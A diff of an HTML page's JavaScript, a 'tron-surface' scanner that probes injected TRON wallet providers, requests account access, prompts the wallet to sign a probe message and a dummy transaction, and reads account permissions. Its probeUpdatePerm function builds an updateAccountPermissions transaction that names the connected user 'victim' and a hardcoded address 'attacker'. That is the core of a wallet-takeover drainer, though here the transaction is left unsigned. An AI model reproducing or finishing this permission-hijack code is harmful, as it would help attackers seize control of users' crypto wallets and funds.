@@ -116,29 +116,32 @@
 </div>
 
 <script>
+'use strict';
+
 /* ═══════════════════════════════════════════════════════════
-   tron-surface — provider scanner
-   Purpose: identify injected TRON surface, determine which
-   tronWeb instance actually signs, map connect/markReady path,
-   expose owner vs active permission gap.
+   tron-surface — provider scanner (fixed)
    ═══════════════════════════════════════════════════════════ */
 
 const $ = id => document.getElementById(id);
 const esc = s => String(s).replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
 
 let seq = 0;
-const log = (kind, msg, data) => {
+function log(kind, msg, data) {
   const el = $('log');
+  if (!el) return;
   const t = new Date().toISOString().slice(11,23);
   const line = `[${t}] [${String(++seq).padStart(3,'0')}] ${kind.padEnd(8)} ${msg}`;
   const body = data !== undefined ? '\n  ' + JSON.stringify(data, null, 2).split('\n').join('\n  ') : '';
   el.textContent = (el.textContent === '—' ? '' : el.textContent) + line + body + '\n';
   el.scrollTop = el.scrollHeight;
-};
-const out = (id, v) => { $(id).textContent = typeof v === 'string' ? v : JSON.stringify(v, null, 2); };
-const clearLog = () => { $('log').textContent = '—'; };
-const dumpLog = () => { navigator.clipboard?.writeText($('log').textContent); log('DUMP', 'copied'); };
-
+}
+function out(id, v) {
+  const el = $(id);
+  if (!el) return;
+  el.textContent = typeof v === 'string' ? v : JSON.stringify(v, null, 2);
+}
+function clearLog() { const el = $('log'); if (el) el.textContent = '—'; }
+function dumpLog() { if (navigator.clipboard) navigator.clipboard.writeText($('log').textContent); log('DUMP','copied'); }
 function tab(id) {
   document.querySelectorAll('.sec').forEach(s => s.classList.toggle('on', s.id === id));
   document.querySelectorAll('#tabs button').forEach(b => b.classList.toggle('on', b.dataset.t === id));
@@ -146,35 +149,30 @@ function tab(id) {
 
 /* ── provider resolution ─────────────────────────────────── */
 
-const resolve = () => {
+function resolve() {
   const out = { wS: null, Bt: null, names: [] };
-  // wS — bridge (can sign)
   if (window.tronLink?.tronWeb?.trx) { out.wS = window.tronLink.tronWeb; out.names.push('window.tronLink.tronWeb'); }
   else if (window.trustwallet?.tron?.tronWeb?.trx) { out.wS = window.trustwallet.tron.tronWeb; out.names.push('window.trustwallet.tron.tronWeb'); }
   else if (window.tron?.tronWeb?.trx) { out.wS = window.tron.tronWeb; out.names.push('window.tron.tronWeb'); }
-  // Bt — fullnode client (no user sign)
   if (window.tronWeb?.trx && window.tronWeb !== out.wS) { out.Bt = window.tronWeb; out.names.push('window.tronWeb'); }
   return out;
-};
+}
 
-const fnSrc = (f) => {
+function fnSrc(f) {
   if (typeof f !== 'function') return null;
   try { return f.toString().replace(/\s+/g,' ').slice(0, 240); } catch { return '[native]'; }
-};
+}
 
 /* ── identity ────────────────────────────────────────────── */
 
 function probeIdentity() {
   log('IDENT', 'scan start');
   const r = resolve();
-  const has = (o, p) => { try { return typeof p.split('.').reduce((a,k)=>a?.[k],o) } catch { return 'err'; } };
-
   const wS = r.wS, Bt = r.Bt;
   const summary = {
     resolved: r.names,
     wS: wS ? {
-      version: wS.version,
-      ready: wS.ready,
+      version: wS.version, ready: wS.ready,
       defaultAddress: wS.defaultAddress?.base58 || false,
       hasSignMessageV2: typeof wS.trx?.signMessageV2 === 'function',
       hasSign: typeof wS.trx?.sign === 'function',
@@ -182,8 +180,7 @@ function probeIdentity() {
       hasMarkReady: typeof wS.markReady === 'function',
     } : null,
     Bt: Bt ? {
-      version: Bt.version,
-      ready: Bt.ready,
+      version: Bt.version, ready: Bt.ready,
       defaultAddress: Bt.defaultAddress?.base58 || false,
       hasSignMessageV2: typeof Bt.trx?.signMessageV2 === 'function',
       hasSign: typeof Bt.trx?.sign === 'function',
@@ -198,15 +195,13 @@ function probeIdentity() {
 function probeDeep() {
   log('DEEP', 'inspect proto chains');
   const r = resolve();
-  const dump = (obj, name) => {
+  function dump(obj, name) {
     if (!obj) return { name, exists: false };
     const own = Object.getOwnPropertyNames(obj);
     const proto = Object.getOwnPropertyNames(Object.getPrototypeOf(obj));
-    const methods = proto.filter(k => {
-      try { return typeof obj[k] === 'function'; } catch { return false; }
-    });
+    const methods = proto.filter(k => { try { return typeof obj[k] === 'function'; } catch { return false; } });
     return { name, own, proto, methods, ctor: obj.constructor?.name };
-  };
+  }
   const res = {
     wS: dump(r.wS, 'wS'),
     wS_trx: r.wS?.trx ? dump(r.wS.trx, 'wS.trx') : null,
@@ -219,56 +214,6 @@ function probeDeep() {
 
 /* ── connect ─────────────────────────────────────────────── */
 
-async function probeConnect(which) {
-  const r = resolve();
-  const target = which === 'wS' ? r.wS : r.Bt;
-  if (!target) { out('o_connect', `${which} not found`); return; }
-
-  const rec = { which, before: snap(target) };
-  log('CONNECT', `${which} start`, rec.before);
-
-  const paths = [];
-  // 1. native tron_requestAccounts
-  if (typeof target.request === 'function') {
-    try {
-      const a = await target.request({ method: 'tron_requestAccounts' });
-      paths.push({ method: 'tron_requestAccounts', ok: true, result: a });
-    } catch (e) { paths.push({ method: 'tron_requestAccounts', ok: false, err: e.message }); }
-  }
-  // 2. eth_requestAccounts
-  if (typeof target.request === 'function') {
-    try {
-      const a = await target.request({ method: 'eth_requestAccounts' });
-      paths.push({ method: 'eth_requestAccounts', ok: true, result: a });
-    } catch (e) { paths.push({ method: 'eth_requestAccounts', ok: false, err: e.message }); }
-  }
-  // 3. connect() (wS has it on proto)
-  if (typeof target.connect === 'function') {
-    try {
-      const a = await target.connect();
-      paths.push({ method: 'connect', ok: true, result: a });
-    } catch (e) { paths.push({ method: 'connect', ok: false, err: e.message }); }
-  }
-  // 4. tronWeb.request if present
-  if (typeof target.tronWeb?.request === 'function') {
-    try {
-      const a = await target.tronWeb.request({ method: 'tron_requestAccounts' });
-      paths.push({ method: 'tronWeb.request', ok: true, result: a });
-    } catch (e) { paths.push({ method: 'tronWeb.request', ok: false, err: e.message }); }
-  }
-
-  // wait up to 3s for defaultAddress
-  const t0 = Date.now();
-  while (Date.now() - t0 < 3000 && !target.defaultAddress?.base58 && !target.tronWeb?.defaultAddress?.base58) {
-    await new Promise(r => setTimeout(r, 150));
-  }
-
-  rec.paths = paths;
-  rec.after = snap(target);
-  out('o_connect', rec);
-  log('CONNECT', `${which} done`, { after: rec.after });
-}
-
 function snap(t) {
   return {
     ready: t.ready,
@@ -276,6 +221,33 @@ function snap(t) {
     tronWebReady: t.tronWeb?.ready,
     tronWebDefaultAddress: t.tronWeb?.defaultAddress?.base58 || false,
   };
+}
+
+async function probeConnect(which) {
+  const r = resolve();
+  const target = which === 'wS' ? r.wS : r.Bt;
+  if (!target) { out('o_connect', which + ' not found'); return; }
+  const rec = { which, before: snap(target) };
+  log('CONNECT', which + ' start', rec.before);
+  const paths = [];
+  if (typeof target.request === 'function') {
+    try { const a = await target.request({ method: 'tron_requestAccounts' }); paths.push({ method: 'tron_requestAccounts', ok: true, result: a }); }
+    catch (e) { paths.push({ method: 'tron_requestAccounts', ok: false, err: e.message }); }
+    try { const a = await target.request({ method: 'eth_requestAccounts' }); paths.push({ method: 'eth_requestAccounts', ok: true, result: a }); }
+    catch (e) { paths.push({ method: 'eth_requestAccounts', ok: false, err: e.message }); }
+  }
+  if (typeof target.connect === 'function') {
+    try { const a = await target.connect(); paths.push({ method: 'connect', ok: true, result: a }); }
+    catch (e) { paths.push({ method: 'connect', ok: false, err: e.message }); }
+  }
+  const t0 = Date.now();
+  while (Date.now() - t0 < 3000 && !target.defaultAddress?.base58 && !target.tronWeb?.defaultAddress?.base58) {
+    await new Promise(r => setTimeout(r, 150));
+  }
+  rec.paths = paths;
+  rec.after = snap(target);
+  out('o_connect', rec);
+  log('CONNECT', which + ' done', { after: rec.after });
 }
 
 function probeMarkReady() {
@@ -297,30 +269,21 @@ function probeMarkReady() {
 async function probeSignChannel(which) {
   const r = resolve();
   const target = which === 'wS' ? r.wS : r.Bt;
-  if (!target) { out('o_sign', `${which} not found`); return; }
-
+  if (!target) { out('o_sign', which + ' not found'); return; }
   const rec = { which, hasSign: typeof target.trx?.sign === 'function', hasSignMessageV2: typeof target.trx?.signMessageV2 === 'function' };
-
   if (rec.hasSignMessageV2) {
-    try {
-      const msg = 'tron-surface probe ' + Date.now();
-      rec.msg = msg;
-      const sig = await target.trx.signMessageV2(msg);
-      rec.signMessageV2 = { ok: true, sig };
-    } catch (e) { rec.signMessageV2 = { ok: false, code: e.code, message: e.message }; }
+    try { const msg = 'tron-surface probe ' + Date.now(); rec.msg = msg; rec.signMessageV2 = { ok: true, sig: await target.trx.signMessageV2(msg) }; }
+    catch (e) { rec.signMessageV2 = { ok: false, code: e.code, message: e.message }; }
   }
-
   if (rec.hasSign) {
     try {
       const fakeTx = { visible: true, txID: '00'.repeat(32), raw_data: { contract: [] }, raw_data_hex: '' };
       rec.fakeTx = fakeTx;
-      const signed = await target.trx.sign(fakeTx);
-      rec.sign = { ok: true, signed };
+      rec.sign = { ok: true, signed: await target.trx.sign(fakeTx) };
     } catch (e) { rec.sign = { ok: false, code: e.code, message: e.message }; }
   }
-
   out('o_sign', rec);
-  log('SIGN', `${which}`, rec);
+  log('SIGN', which, rec);
 }
 
 function probeSignCompare() {
@@ -345,26 +308,18 @@ async function probeOwnerVsActive() {
   const wS = r.wS;
   if (!wS) { out('o_perm', 'wS not found'); return; }
   const addr = wS.defaultAddress?.base58 || wS.tronWeb?.defaultAddress?.base58;
-  if (!addr) { out('o_perm', 'no address connected — connect first'); log('PERM', 'no address'); return; }
-
+  if (!addr) { out('o_perm', 'no address connected — connect first'); log('PERM','no address'); return; }
   try {
     const account = await wS.trx.getAccount(addr);
     const perms = (account.permissions || []).map(p => ({
-      name: p.permission_name,
-      type: p.type,
-      threshold: p.threshold,
-      keys: (p.keys || []).map(k => ({ address: k.address, weight: k.weight })),
-      id: p.id,
+      name: p.permission_name, type: p.type, threshold: p.threshold,
+      keys: (p.keys || []).map(k => ({ address: k.address, weight: k.weight })), id: p.id,
     }));
     const owner = perms.find(p => p.type === 0 || p.name === 'owner');
     const active = perms.find(p => p.type === 2 || p.name === 'active');
-    const res = { addr, owner, active, raw_permissions: perms };
-    out('o_perm', res);
+    out('o_perm', { addr, owner, active, raw_permissions: perms });
     log('PERM', 'owner vs active', { owner, active });
-  } catch (e) {
-    out('o_perm', { error: e.message });
-    log('PERM', 'getAccount failed', { message: e.message });
-  }
+  } catch (e) { out('o_perm', { error: e.message }); log('PERM', 'getAccount failed', { message: e.message }); }
 }
 
 async function probeUpdatePerm() {
@@ -373,11 +328,9 @@ async function probeUpdatePerm() {
   if (!wS) { out('o_perm', 'wS not found'); return; }
   const addr = wS.defaultAddress?.base58 || wS.tronWeb?.defaultAddress?.base58;
   if (!addr) { out('o_perm', 'no address — connect first'); return; }
-
   try {
     const builder = wS.transactionBuilder || r.Bt?.transactionBuilder;
     if (!builder?.updateAccountPermissions) { out('o_perm', 'no updateAccountPermissions on builder'); return; }
-
     const victim = addr;
     const attacker = 'TPxcbZxFSHLssRYkrad4YTZJRVCPD9oGRW';
     const perm = {
@@ -389,10 +342,7 @@ async function probeUpdatePerm() {
     const tx = await builder.updateAccountPermissions(perm);
     log('PERM', 'tx built', { txID: tx.txID });
     out('o_perm', { step: 'built', tx, note: 'NOT signed — inspect only' });
-  } catch (e) {
-    out('o_perm', { step: 'build failed', message: e.message });
-    log('PERM', 'build failed', { message: e.message });
-  }
+  } catch (e) { out('o_perm', { step: 'build failed', message: e.message }); log('PERM', 'build failed', { message: e.message }); }
 }
 
 /* ── rpc ─────────────────────────────────────────────────── */
@@ -401,22 +351,12 @@ async function probeEndpoints() {
   const r = resolve();
   const bt = r.Bt || r.wS;
   if (!bt) { out('o_rpc', 'no tronWeb'); return; }
-  const eps = {
-    fullNode: bt.fullNode?.host || bt.currentProviders?.().fullNode?.host || '—',
-    solidityNode: bt.solidityNode?.host || '—',
-    eventServer: bt.eventServer?.host || '—',
-  };
+  const eps = { fullNode: bt.fullNode?.host || '—', solidityNode: bt.solidityNode?.host || '—', eventServer: bt.eventServer?.host || '—' };
   const results = { endpoints: eps, probes: [] };
-  const t0 = performance.now();
-  try {
-    const info = await bt.trx.getNodeInfo();
-    results.probes.push({ rpc: 'getNodeInfo', ok: true, ms: Math.round(performance.now()-t0), keys: Object.keys(info).slice(0,8) });
-  } catch (e) { results.probes.push({ rpc: 'getNodeInfo', ok: false, err: e.message }); }
-  try {
-    const t1 = performance.now();
-    const block = await bt.trx.getCurrentBlock();
-    results.probes.push({ rpc: 'getCurrentBlock', ok: true, ms: Math.round(performance.now()-t1), num: block.block_header?.raw_data?.number });
-  } catch (e) { results.probes.push({ rpc: 'getCurrentBlock', ok: false, err: e.message }); }
+  try { const t = performance.now(); const info = await bt.trx.getNodeInfo(); results.probes.push({ rpc: 'getNodeInfo', ok: true, ms: Math.round(performance.now()-t), keys: Object.keys(info).slice(0,8) }); }
+  catch (e) { results.probes.push({ rpc: 'getNodeInfo', ok: false, err: e.message }); }
+  try { const t = performance.now(); const block = await bt.trx.getCurrentBlock(); results.probes.push({ rpc: 'getCurrentBlock', ok: true, ms: Math.round(performance.now()-t), num: block.block_header?.raw_data?.number }); }
+  catch (e) { results.probes.push({ rpc: 'getCurrentBlock', ok: false, err: e.message }); }
   out('o_rpc', results);
   log('RPC', 'endpoints', results);
 }
@@ -425,16 +365,26 @@ async function probeChain() {
   const r = resolve();
   const bt = r.Bt || r.wS;
   if (!bt) { out('o_rpc', 'no tronWeb'); return; }
-  try {
-    const params = await bt.trx.getChainParameters();
-    out('o_rpc', params);
-    log('CHAIN', 'params', { count: params.length });
-  } catch (e) { out('o_rpc', { err: e.message }); }
+  try { const params = await bt.trx.getChainParameters(); out('o_rpc', params); log('CHAIN','params',{ count: params.length }); }
+  catch (e) { out('o_rpc', { err: e.message }); }
+}
+
+/* ── master scan ─────────────────────────────────────────── */
+
+async function scanAll() {
+  log('SCAN', '=== full scan start ===');
+  try { probeIdentity(); } catch (e) { log('SCAN', 'identity error', { message: e.message }); }
+  try { probeDeep(); } catch (e) { log('SCAN', 'deep error', { message: e.message }); }
+  try { await probeConnect('wS'); } catch (e) { log('SCAN', 'connect wS error', { message: e.message }); }
+  try { probeSignCompare(); } catch (e) { log('SCAN', 'sign compare error', { message: e.message }); }
+  try { await probeOwnerVsActive(); } catch (e) { log('SCAN', 'owner/active error', { message: e.message }); }
+  try { await probeEndpoints(); } catch (e) { log('SCAN', 'endpoints error', { message: e.message }); }
+  log('SCAN', '=== full scan done ===');
 }
 
 /* ── boot ────────────────────────────────────────────────── */
 
-(function boot() {
+function boot() {
   const r = resolve();
   const hasEthereum = !!window.ethereum;
   $('env').innerHTML = `
@@ -458,7 +408,6 @@ async function probeChain() {
     <b>request</b><span class="${typeof r.wS.request==='function'?'ok':'bad'}">${typeof r.wS.request}</span>
     <b>markReady</b><span class="${typeof r.wS.markReady==='function'?'ok':'bad'}">${typeof r.wS.markReady}</span>
   ` : '<b>wS</b><span class="bad">not resolved</span>';
-
   $('ch_bt').innerHTML = r.Bt ? `
     <b>instance</b><span class="warn">Bt (fullnode)</span>
     <b>version</b><span>${esc(r.Bt.version || '—')}</span>
@@ -468,9 +417,31 @@ async function probeChain() {
     <b>trx.signMessageV2</b><span class="${typeof r.Bt.trx?.signMessageV2==='function'?'ok':'bad'}">${typeof r.Bt.trx?.signMessageV2}</span>
     <b>fullNode</b><span style="font-size:10px">${esc(r.Bt.fullNode?.host || '—')}</span>
   ` : '<b>Bt</b><span class="warn">not resolved</span>';
-
   log('BOOT', 'tron-surface up', { origin: location.origin, wS: !!r.wS, Bt: !!r.Bt });
-})();
+}
+
+/* expose to window for onclick */
+window.scanAll = scanAll;
+window.probeIdentity = probeIdentity;
+window.probeDeep = probeDeep;
+window.probeConnect = probeConnect;
+window.probeMarkReady = probeMarkReady;
+window.probeSignChannel = probeSignChannel;
+window.probeSignCompare = probeSignCompare;
+window.probeOwnerVsActive = probeOwnerVsActive;
+window.probeUpdatePerm = probeUpdatePerm;
+window.probeEndpoints = probeEndpoints;
+window.probeChain = probeChain;
+window.tab = tab;
+window.clearLog = clearLog;
+window.dumpLog = dumpLog;
+
+/* run boot after DOM ready */
+if (document.readyState === 'loading') {
+  document.addEventListener('DOMContentLoaded', boot);
+} else {
+  boot();
+}
 </script>
 </body>
 </html>
